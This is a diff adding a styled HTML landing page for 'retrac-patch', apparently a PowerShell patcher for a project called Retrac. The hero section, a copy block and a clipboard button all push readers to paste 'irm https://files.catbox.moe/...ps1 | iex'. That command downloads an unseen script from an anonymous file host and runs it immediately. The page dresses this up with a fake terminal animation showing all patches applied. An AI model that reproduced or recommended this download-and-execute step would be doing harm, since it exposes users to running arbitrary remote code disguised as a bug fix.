@@ -1,0 +1,679 @@
+
+Copy
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>retrac-patch — PS Command Patcher</title>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+ 
+    :root {
+      --bg: #000000;
+      --surface: #0a0a0a;
+      --border: #1f1f1f;
+      --text: #ffffff;
+      --muted: #666666;
+      --accent: #e0e0e0;
+      --green: #4ade80;
+      --dim: #2a2a2a;
+      --font-mono: 'JetBrains Mono', monospace;
+      --font-alt: 'Space Mono', monospace;
+    }
+ 
+    html { scroll-behavior: smooth; }
+ 
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-mono);
+      line-height: 1.6;
+      overflow-x: hidden;
+    }
+ 
+    /* ─── Noise overlay ─── */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
+      pointer-events: none;
+      z-index: 9999;
+      opacity: 0.4;
+    }
+ 
+    /* ─── Scanline effect ─── */
+    body::after {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background: repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(255,255,255,0.012) 2px,
+        rgba(255,255,255,0.012) 4px
+      );
+      pointer-events: none;
+      z-index: 9998;
+    }
+ 
+    /* ─── Animations ─── */
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(24px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to   { opacity: 1; }
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50%       { opacity: 0; }
+    }
+    @keyframes scanH {
+      from { transform: translateX(-100%); }
+      to   { transform: translateX(100vw); }
+    }
+    @keyframes pulse-border {
+      0%, 100% { border-color: var(--border); }
+      50%       { border-color: #333; }
+    }
+    @keyframes glitch {
+      0%   { clip-path: inset(0 0 98% 0); transform: translate(-2px, 0); }
+      10%  { clip-path: inset(30% 0 50% 0); transform: translate(2px, 0); }
+      20%  { clip-path: inset(60% 0 20% 0); transform: translate(-1px, 0); }
+      30%  { clip-path: inset(10% 0 80% 0); transform: translate(1px, 0); }
+      40%  { clip-path: inset(90% 0 2% 0);  transform: translate(-2px, 0); }
+      50%  { clip-path: inset(45% 0 45% 0); transform: translate(0, 0); }
+      100% { clip-path: inset(0 0 0 0);     transform: translate(0, 0); }
+    }
+    @keyframes spin-slow {
+      from { transform: rotate(0deg); }
+      to   { transform: rotate(360deg); }
+    }
+    @keyframes float {
+      0%, 100% { transform: translateY(0px); }
+      50%       { transform: translateY(-8px); }
+    }
+    @keyframes shimmer {
+      0%   { background-position: -200% center; }
+      100% { background-position:  200% center; }
+    }
+    @keyframes typewriter {
+      from { width: 0; }
+      to   { width: 100%; }
+    }
+ 
+    /* ─── Nav ─── */
+    nav {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      z-index: 100;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 1.2rem 2.5rem;
+      border-bottom: 1px solid var(--border);
+      background: rgba(0,0,0,0.85);
+      backdrop-filter: blur(12px);
+      animation: fadeIn 0.6s ease both;
+    }
+    .nav-logo {
+      font-family: var(--font-alt);
+      font-size: 0.9rem;
+      letter-spacing: 0.08em;
+      color: var(--text);
+    }
+    .nav-logo span { color: var(--green); }
+    .nav-links { display: none; }
+    .nav-badge {
+      font-size: 0.7rem;
+      padding: 0.25rem 0.6rem;
+      border: 1px solid var(--border);
+      color: var(--muted);
+      letter-spacing: 0.05em;
+    }
+ 
+    /* ─── Hero ─── */
+    .hero {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 8rem 2.5rem 5rem;
+      position: relative;
+      overflow: hidden;
+    }
+    .hero-grid {
+      position: absolute;
+      inset: 0;
+      background-image:
+        linear-gradient(var(--border) 1px, transparent 1px),
+        linear-gradient(90deg, var(--border) 1px, transparent 1px);
+      background-size: 48px 48px;
+      opacity: 0.3;
+      mask-image: radial-gradient(ellipse 80% 60% at 50% 40%, black 30%, transparent 100%);
+    }
+    .hero-tag {
+      font-size: 0.72rem;
+      letter-spacing: 0.2em;
+      text-transform: uppercase;
+      color: var(--muted);
+      margin-bottom: 1.5rem;
+      animation: fadeUp 0.6s 0.1s ease both;
+    }
+    .hero-tag span {
+      display: inline-block;
+      width: 24px;
+      height: 1px;
+      background: var(--muted);
+      vertical-align: middle;
+      margin-right: 0.6rem;
+    }
+ 
+    h1 {
+      font-family: var(--font-alt);
+      font-size: clamp(2.8rem, 7vw, 6rem);
+      font-weight: 700;
+      line-height: 1.0;
+      letter-spacing: -0.02em;
+      margin-bottom: 0.3rem;
+      animation: fadeUp 0.7s 0.2s ease both;
+      position: relative;
+    }
+    h1::after {
+      content: attr(data-text);
+      position: absolute;
+      left: 0; top: 0;
+      color: rgba(255,255,255,0.06);
+      animation: glitch 6s 3s infinite;
+    }
+    .hero-sub {
+      font-size: clamp(1rem, 2vw, 1.4rem);
+      color: var(--muted);
+      margin-bottom: 3rem;
+      animation: fadeUp 0.7s 0.35s ease both;
+    }
+    .hero-sub strong { color: var(--accent); }
+ 
+    /* ─── Terminal block ─── */
+    .terminal {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      max-width: 560px;
+      animation: fadeUp 0.7s 0.5s ease both, pulse-border 4s 1s infinite;
+      position: relative;
+      overflow: hidden;
+    }
+    .terminal::before {
+      content: '';
+      position: absolute;
+      top: 0; left: -100%;
+      width: 60%;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+      animation: scanH 3s 1.5s ease infinite;
+    }
+    .terminal-bar {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.7rem 1rem;
+      border-bottom: 1px solid var(--border);
+      background: #060606;
+    }
+    .dot {
+      width: 10px; height: 10px;
+      border-radius: 50%;
+    }
+    .dot-r { background: #3a1414; }
+    .dot-y { background: #2a2400; }
+    .dot-g { background: #0a2a0a; }
+    .terminal-title {
+      font-size: 0.7rem;
+      color: var(--muted);
+      margin-left: auto;
+      letter-spacing: 0.05em;
+    }
+    .terminal-body {
+      padding: 1.2rem 1.5rem;
+      font-size: 0.9rem;
+    }
+    .t-line {
+      display: flex;
+      gap: 0.5rem;
+      margin-bottom: 0.4rem;
+      opacity: 0;
+      animation: fadeIn 0.4s ease both;
+    }
+    .t-line:nth-child(1) { animation-delay: 0.8s; }
+    .t-line:nth-child(2) { animation-delay: 1.1s; }
+    .t-line:nth-child(3) { animation-delay: 1.4s; }
+    .t-line:nth-child(4) { animation-delay: 1.7s; }
+    .t-line:nth-child(5) { animation-delay: 2.0s; }
+    .prompt { color: var(--green); user-select: none; }
+    .cmd { color: var(--text); }
+    .cmd-accent { color: #93c5fd; }
+    .cmd-flag  { color: #fbbf24; }
+    .output { color: var(--muted); font-size: 0.82rem; }
+    .output.ok { color: var(--green); }
+    .cursor {
+      display: inline-block;
+      width: 8px; height: 1em;
+      background: var(--text);
+      vertical-align: middle;
+      margin-left: 2px;
+      animation: blink 1s step-end infinite;
+    }
+ 
+    /* ─── Copy block ─── */
+    .copy-block {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 1rem;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      max-width: 560px;
+      width: 100%;
+      padding: 0.85rem 1.2rem;
+      margin-top: 1rem;
+      animation: fadeUp 0.7s 0.65s ease both;
+    }
+    .copy-cmd {
+      font-family: var(--font-mono);
+      font-size: 0.82rem;
+      color: var(--accent);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .copy-btn {
+      background: none;
+      border: 1px solid var(--border);
+      color: var(--muted);
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      padding: 0.35rem 0.8rem;
+      cursor: pointer;
+      transition: color 0.2s, border-color 0.2s;
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+    .copy-btn:hover { color: var(--text); border-color: #444; }
+    .copy-btn.copied { color: var(--green); border-color: var(--green); }
+ 
+ 
+    .metrics {
+      display: flex;
+      gap: 3rem;
+      margin-top: 3rem;
+      justify-content: center;
+      animation: fadeUp 0.7s 0.7s ease both;
+    }
+    .metric-val {
+      font-family: var(--font-alt);
+      font-size: 2rem;
+      font-weight: 700;
+      background: linear-gradient(90deg, #fff 0%, #888 50%, #fff 100%);
+      background-size: 200% auto;
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: shimmer 3s linear infinite;
+    }
+    .metric-label {
+      font-size: 0.72rem;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+    }
+ 
+    /* ─── Section base ─── */
+    section {
+      padding: 6rem 2.5rem;
+      max-width: 1100px;
+      margin: 0 auto;
+    }
+    .section-tag {
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      letter-spacing: 0.2em;
+      color: var(--muted);
+      margin-bottom: 0.8rem;
+    }
+    h2 {
+      font-family: var(--font-alt);
+      font-size: clamp(1.6rem, 3.5vw, 2.8rem);
+      font-weight: 700;
+      line-height: 1.1;
+      margin-bottom: 1rem;
+    }
+    .section-desc {
+      color: var(--muted);
+      max-width: 560px;
+      font-size: 0.9rem;
+      margin-bottom: 3rem;
+    }
+ 
+    /* ─── Divider ─── */
+    .divider {
+      height: 1px;
+      background: var(--border);
+      max-width: 1100px;
+      margin: 0 auto;
+    }
+ 
+    /* ─── Bug fixes grid ─── */
+    .fixes-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+      gap: 1px;
+      background: var(--border);
+      border: 1px solid var(--border);
+    }
+    .fix-card {
+      background: var(--bg);
+      padding: 1.8rem;
+      transition: background 0.2s;
+      position: relative;
+      overflow: hidden;
+    }
+    .fix-card:hover { background: #080808; }
+    .fix-card::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0;
+      width: 2px;
+      height: 0;
+      background: var(--green);
+      transition: height 0.3s ease;
+    }
+    .fix-card:hover::before { height: 100%; }
+    .fix-icon {
+      font-size: 1rem;
+      margin-bottom: 1rem;
+      display: inline-block;
+      animation: float 3s ease-in-out infinite;
+    }
+    .fix-card:nth-child(2) .fix-icon { animation-delay: 0.4s; }
+    .fix-card:nth-child(3) .fix-icon { animation-delay: 0.8s; }
+    .fix-card:nth-child(4) .fix-icon { animation-delay: 1.2s; }
+    .fix-card:nth-child(5) .fix-icon { animation-delay: 1.6s; }
+    .fix-card:nth-child(6) .fix-icon { animation-delay: 2.0s; }
+    .fix-title {
+      font-family: var(--font-alt);
+      font-size: 0.85rem;
+      font-weight: 700;
+      margin-bottom: 0.5rem;
+      letter-spacing: 0.04em;
+    }
+    .fix-desc {
+      font-size: 0.78rem;
+      color: var(--muted);
+      line-height: 1.7;
+    }
+    .fix-tag {
+      display: inline-block;
+      margin-top: 0.8rem;
+      font-size: 0.65rem;
+      padding: 0.2rem 0.5rem;
+      border: 1px solid var(--dim);
+      color: var(--muted);
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+ 
+    /* ─── Usage section ─── */
+    .usage-layout {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 3rem;
+      align-items: start;
+    }
+    @media (max-width: 700px) {
+      .usage-layout { grid-template-columns: 1fr; }
+    }
+    .code-block {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      padding: 1.5rem;
+      position: relative;
+    }
+    .code-label {
+      position: absolute;
+      top: -1px; right: 1.5rem;
+      font-size: 0.65rem;
+      padding: 0.2rem 0.6rem;
+      background: var(--border);
+      color: var(--muted);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+    .code-block code {
+      font-size: 0.82rem;
+      line-height: 1.9;
+      display: block;
+      white-space: pre;
+    }
+    .c-green  { color: var(--green); }
+    .c-blue   { color: #93c5fd; }
+    .c-yellow { color: #fbbf24; }
+    .c-muted  { color: var(--muted); }
+    .c-white  { color: var(--text); }
+ 
+    .steps { display: flex; flex-direction: column; gap: 1.5rem; }
+    .step {
+      display: flex;
+      gap: 1.2rem;
+      align-items: flex-start;
+    }
+    .step-num {
+      font-family: var(--font-alt);
+      font-size: 0.72rem;
+      color: var(--muted);
+      padding-top: 0.1rem;
+      min-width: 2rem;
+      letter-spacing: 0.05em;
+    }
+    .step-body {}
+    .step-title {
+      font-weight: 700;
+      font-size: 0.85rem;
+      margin-bottom: 0.25rem;
+    }
+    .step-desc { font-size: 0.78rem; color: var(--muted); }
+    .inline-code {
+      background: var(--dim);
+      padding: 0.1rem 0.4rem;
+      font-size: 0.8rem;
+      color: var(--accent);
+    }
+ 
+    /* ─── License ─── */
+    .license-box {
+      border: 1px solid var(--border);
+      padding: 2rem 2.5rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 2rem;
+      flex-wrap: wrap;
+    }
+    .license-badge {
+      font-family: var(--font-alt);
+      font-size: 2.5rem;
+      font-weight: 700;
+      color: #222;
+      -webkit-text-stroke: 1px #444;
+      letter-spacing: 0.05em;
+    }
+    .license-text { font-size: 0.82rem; color: var(--muted); max-width: 500px; line-height: 1.8; }
+    .license-text a { color: var(--accent); text-decoration: none; border-bottom: 1px solid var(--border); }
+ 
+    /* ─── Footer ─── */
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 2rem 2.5rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 1rem;
+    }
+    .footer-logo { font-family: var(--font-alt); font-size: 0.85rem; }
+    .footer-logo span { color: var(--green); }
+    .footer-meta { font-size: 0.72rem; color: var(--muted); }
+ 
+    /* ─── Scroll reveal ─── */
+    .reveal {
+      opacity: 0;
+      transform: translateY(20px);
+      transition: opacity 0.6s ease, transform 0.6s ease;
+    }
+    .reveal.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+ 
+    /* ─── Mobile ─── */
+    @media (max-width: 600px) {
+      nav { padding: 1rem 1.2rem; }
+      .nav-links { display: none; }
+      .hero { padding: 6rem 1.2rem 3rem; }
+      section { padding: 4rem 1.2rem; }
+      .metrics { gap: 1.5rem; }
+      footer { padding: 1.5rem 1.2rem; }
+    }
+  </style>
+</head>
+<body>
+ 
+  <!-- NAV -->
+  <nav>
+    <div class="nav-logo">retrac<span>-patch</span></div>
+ 
+    <div class="nav-badge">v1.0.0 · PS</div>
+  </nav>
+ 
+  <!-- HERO -->
+  <header class="hero">
+    <div class="hero-grid"></div>
+    <div class="hero-tag"><span></span>PowerShell Patcher Utility</div>
+ 
+    <h1 data-text="retrac-patch">retrac-patch</h1>
+    <p class="hero-sub">
+      A dead-simple <strong>PowerShell command</strong> that patches Retrac<br/>
+      and fixes <strong>most known bugs</strong> in one shot.
+    </p>
+ 
+    <!-- Terminal -->
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div>
+        <div class="dot dot-y"></div>
+        <div class="dot dot-g"></div>
+        <span class="terminal-title">Windows PowerShell</span>
+      </div>
+      <div class="terminal-body">
+        <div class="t-line">
+          <span class="prompt">PS C:\&gt;</span>
+          <span class="cmd"><span class="cmd-accent">irm</span> <span class="cmd-flag">https://files.catbox.moe/6drfgf.ps1</span> <span class="cmd-accent">| iex</span></span>
+        </div>
+        <div class="t-line">
+          <span class="output">[*] Detecting Retrac installation...</span>
+        </div>
+        <div class="t-line">
+          <span class="output">[*] Applying patches (12 fixes bundled)</span>
+        </div>
+        <div class="t-line">
+          <span class="output ok">[✓] All patches applied successfully.</span>
+        </div>
+        <div class="t-line">
+          <span class="prompt">PS C:\&gt;</span>
+          <span class="cursor"></span>
+        </div>
+      </div>
+    </div>
+ 
+    <!-- Copy block -->
+    <div class="copy-block">
+      <span class="copy-cmd">irm https://files.catbox.moe/6drfgf.ps1 | iex</span>
+      <button class="copy-btn" id="copyBtn" onclick="copyCmd()">Copy</button>
+    </div>
+ 
+    <!-- Metrics -->
+    <div class="metrics">
+      <div>
+        <div class="metric-val">12+</div>
+        <div class="metric-label">Bug Fixes</div>
+      </div>
+      <div>
+        <div class="metric-val">1</div>
+        <div class="metric-label">Command</div>
+      </div>
+      <div>
+        <div class="metric-val">MIT</div>
+        <div class="metric-label">Licensed</div>
+      </div>
+    </div>
+  </header>
+ 
+  <div class="divider"></div>
+ 
+  <!-- LICENSE -->
+  <section id="license">
+    <div class="section-tag">// Open source</div>
+    <h2 class="reveal">Free and open.<br/>Always.</h2>
+    <p class="section-desc reveal">retrac-patch is open-source software. Use it, fork it, contribute to it.</p>
+ 
+    <div class="license-box reveal">
+      <div class="license-badge">MIT</div>
+      <div class="license-text">
+        Copyright © 2026 retrac-patch contributors.<br/>
+        Permission is hereby granted, free of charge, to any person obtaining a copy
+        of this software to use, copy, modify, merge, publish, distribute, and/or sell
+        copies, subject to the MIT License conditions.<br/><br/>
+        <a href="https://github.com/Somniiiii12/Retracc-Patcher" target="_blank">View full license on GitHub →</a>
+      </div>
+    </div>
+  </section>
+ 
+  <!-- FOOTER -->
+  <footer>
+    <div class="footer-logo">retrac<span>-patch</span></div>
+    <div class="footer-meta">MIT Licensed · Built for PowerShell · Fixes most Retrac bugs</div>
+  </footer>
+ 
+  <script>
+    // Copy command
+    function copyCmd() {
+      navigator.clipboard.writeText('irm https://files.catbox.moe/6drfgf.ps1 | iex');
+      const btn = document.getElementById('copyBtn');
+      btn.textContent = 'Copied!';
+      btn.classList.add('copied');
+      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+    }
+ 
+    // Scroll reveal
+    const observer = new IntersectionObserver((entries) => {
+      entries.forEach(e => {
+        if (e.isIntersecting) {
+          e.target.classList.add('visible');
+          observer.unobserve(e.target);
+        }
+      });
+    }, { threshold: 0.12 });
+ 
+    document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
+  </script>
+</body>
+</html>
+ 
